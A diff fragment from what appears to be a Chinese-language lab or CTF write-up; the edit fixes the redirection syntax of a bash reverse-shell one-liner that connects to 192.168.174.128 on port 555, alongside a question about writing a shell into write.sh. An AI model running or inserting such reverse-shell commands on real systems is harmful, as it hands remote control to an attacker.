@@ -124,7 +124,7 @@ echo '#!/bin/sh' > write.sh
 ```
 
 ```
-echo 'bash -i &>/dev/tcp/192.168.174.128/555 0>&1'
+echo 'bash -i >& /dev/tcp/192.168.174.128/555 0>&1'
 ```
 
 (这里有个疑惑，为甚不能直接echo '/bin/bash' > write.sh,最后面解答)
